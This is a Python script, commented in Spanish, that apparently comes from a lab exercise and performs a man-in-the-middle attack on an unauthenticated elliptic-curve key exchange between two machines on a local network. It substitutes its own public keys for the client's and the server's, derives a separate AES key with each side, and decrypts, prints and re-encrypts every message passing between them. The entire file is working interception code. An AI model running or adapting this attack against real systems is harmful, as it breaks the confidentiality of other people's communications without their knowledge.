import socket
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os

# Funciones de cifrado y descifrado AES-256 CBC
def aes_encrypt(key, plaintext):
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext) + encryptor.finalize()
    return iv + ciphertext

def aes_decrypt(key, ciphertext):
    iv = ciphertext[:16]
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    plaintext = decryptor.update(ciphertext[16:]) + decryptor.finalize()
    return plaintext

# Crear las llaves del atacante (Actúa como intermediario)
attacker_private_key = ec.generate_private_key(ec.SECP256R1(), default_backend())
attacker_public_key = attacker_private_key.public_key()

attacker_private_key_2 = ec.generate_private_key(ec.SECP256R1(), default_backend())
attacker_public_key_2 = attacker_private_key_2.public_key()

# Serializar las llaves públicas del atacante
attacker_public_bytes = attacker_public_key.public_bytes(
    encoding=serialization.Encoding.X962,
    format=serialization.PublicFormat.UncompressedPoint
)
attacker_public_bytes_2 = attacker_public_key_2.public_bytes(
    encoding=serialization.Encoding.X962,
    format=serialization.PublicFormat.UncompressedPoint
)

# Crear sockets para interceptar entre el cliente y el servidor
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(('192.168.1.14', 65432))  # Dirección IP de PC B (atacante)
server_socket.listen()

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(('192.168.1.15', 65432))  # Dirección IP de PC A (servidor real)

print("Atacante en espera de conexiones...")

# Aceptar conexión del cliente
conn, addr = server_socket.accept()
print(f"Conexión interceptada con el cliente: {addr}")

# Interceptar la clave pública del cliente
client_public_bytes = conn.recv(1024)
client_public_key = ec.EllipticCurvePublicKey.from_encoded_point(ec.SECP256R1(), client_public_bytes)

# Enviar la clave pública del atacante al cliente
conn.sendall(attacker_public_bytes)

# Interceptar la clave pública del servidor
server_public_bytes = client_socket.recv(1024)
server_public_key = ec.EllipticCurvePublicKey.from_encoded_point(ec.SECP256R1(), server_public_bytes)

# Enviar la clave pública del atacante al servidor
client_socket.sendall(attacker_public_bytes_2)

# Derivar llaves simétricas diferentes con el cliente y el servidor
shared_key_with_client = attacker_private_key.exchange(ec.ECDH(), client_public_key)
derived_key_with_client = HKDF(
    algorithm=hashes.SHA256(),
    length=32,
    salt=None,
    info=b'handshake data with client',
    backend=default_backend()
).derive(shared_key_with_client)

shared_key_with_server = attacker_private_key_2.exchange(ec.ECDH(), server_public_key)
derived_key_with_server = HKDF(
    algorithm=hashes.SHA256(),
    length=32,
    salt=None,
    info=b'handshake data with server',
    backend=default_backend()
).derive(shared_key_with_server)

print(f"Llave simétrica con el cliente: {derived_key_with_client.hex()}")
print(f"Llave simétrica con el servidor: {derived_key_with_server.hex()}")

# Comunicación cíclica interceptada
while True:
    # Interceptar mensaje del cliente
    ciphertext_from_client = conn.recv(1024)
    if not ciphertext_from_client:
        break

    decrypted_message_from_client = aes_decrypt(derived_key_with_client, ciphertext_from_client)
    print(f"Mensaje interceptado del cliente: {decrypted_message_from_client.decode()}")

    # Reenviar el mensaje descifrado al servidor (cifrado con la llave del servidor)
    ciphertext_to_server = aes_encrypt(derived_key_with_server, decrypted_message_from_client)
    client_socket.sendall(ciphertext_to_server)

    # Interceptar respuesta del servidor
    ciphertext_from_server = client_socket.recv(1024)
    if not ciphertext_from_server:
        break
    decrypted_message_from_server = aes_decrypt(derived_key_with_server, ciphertext_from_server)
    print(f"Mensaje interceptado del servidor: {decrypted_message_from_server.decode()}")

    # Reenviar el mensaje descifrado al cliente (cifrado con la llave del cliente)
    ciphertext_to_client = aes_encrypt(derived_key_with_client, decrypted_message_from_server)
    conn.sendall(ciphertext_to_client)

conn.close()
client_socket.close()